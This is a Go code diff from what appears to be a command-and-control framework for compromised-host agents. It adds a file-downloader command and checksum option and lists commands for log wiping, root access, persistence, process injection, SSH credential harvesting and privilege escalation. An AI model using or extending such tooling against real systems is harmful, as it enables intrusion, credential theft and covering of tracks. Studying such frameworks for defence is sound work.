@@ -336,31 +336,33 @@ var Modules = map[string]*ModConfig{
 		Date:          "2020-01-25",
 		Comment:       "Download and decrypt a file from other agents, run `file_server` first",
 		Options: map[string][]string{
-			"addr":      {"Download address, eg 10.1.1.1:8000"},
-			"file_path": {"Path to the file to download, eg. /tmp/agent.exe"},
+			"download_url": {"Download address, eg 10.1.1.1:8000"},
+			"path":         {"Path to the file (on server) to download, eg. /tmp/agent.exe"},
+			"checksum":     {"SHA256 checksum of the file, used to verify integrity"},
 		},
 	},
 }
 
 // C2Commands
 const (
-	C2CmdCleanLog      = "!clean_log"
-	C2CmdUpdateAgent   = "!upgrade_agent"
-	C2CmdGetRoot       = "!get_root"
-	C2CmdPersistence   = "!persistence"
-	C2CmdCustomModule  = "!custom_module"
-	C2CmdInject        = "!inject"
-	C2CmdUtils         = "!utils"
-	C2CmdDeletePortFwd = "!delete_portfwd"
-	C2CmdPortFwd       = "!port_fwd"
-	C2CmdProxy         = "!proxy"
-	C2CmdSSHD          = "!sshd"
-	C2CmdSSHHarvester  = "!ssh_harvester"
-	C2CmdLPE           = "!lpe"
-	C2CmdBring2CC      = "!" + ModBring2CC
-	C2CmdStat          = "!stat"
-	C2CmdListener      = "!listener"
-	C2CmdFileServer    = "!file_server"
+	C2CmdCleanLog       = "!clean_log"
+	C2CmdUpdateAgent    = "!upgrade_agent"
+	C2CmdGetRoot        = "!get_root"
+	C2CmdPersistence    = "!persistence"
+	C2CmdCustomModule   = "!custom_module"
+	C2CmdInject         = "!inject"
+	C2CmdUtils          = "!utils"
+	C2CmdDeletePortFwd  = "!delete_portfwd"
+	C2CmdPortFwd        = "!port_fwd"
+	C2CmdProxy          = "!proxy"
+	C2CmdSSHD           = "!sshd"
+	C2CmdSSHHarvester   = "!ssh_harvester"
+	C2CmdLPE            = "!lpe"
+	C2CmdBring2CC       = "!" + ModBring2CC
+	C2CmdStat           = "!stat"
+	C2CmdListener       = "!listener"
+	C2CmdFileServer     = "!file_server"
+	C2CmdFileDownloader = "!file_downloader"
 )
 
 // AgentSystemInfo agent properties
